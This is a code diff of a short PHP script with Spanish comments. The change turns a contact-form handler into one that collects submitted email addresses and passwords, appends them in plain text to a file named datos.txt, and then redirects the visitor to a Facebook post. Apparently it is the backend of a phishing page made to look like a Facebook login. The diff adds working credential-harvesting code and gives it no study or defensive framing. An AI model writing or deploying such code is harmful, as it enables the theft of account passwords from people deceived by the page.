@@ -1,14 +1,14 @@
 <?php
-  // Obtener los datos enviados por la solicitud HTTP POST
-  $nombre = $_POST["nombre"];
-  $correo = $_POST["correo"];
-  $mensaje = $_POST["mensaje"];
+    // Obtener los datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-  // Crear el contenido del archivo de texto
-  $contenido = "Nombre: " . $nombre . "\nCorreo electrónico: " . $correo . "\nMensaje: " . $mensaje;
+    // Crear una cadena con los datos
+    $datos = "Email: " . $email . "\n" . "Password: " . $password . "\n";
 
-  // Escribir los datos en un archivo de texto
-  $archivo = fopen("datos.txt", "a");
-  fwrite($archivo, $contenido . "\n\n");
-  fclose($archivo);
+    // Escribir los datos en un archivo
+    file_put_contents('datos.txt', $datos . "*****\n", FILE_APPEND);
+
+    // Redirigir al usuario a otra página
+    header('Location: https://www.facebook.com/post/85458215644');
 ?>
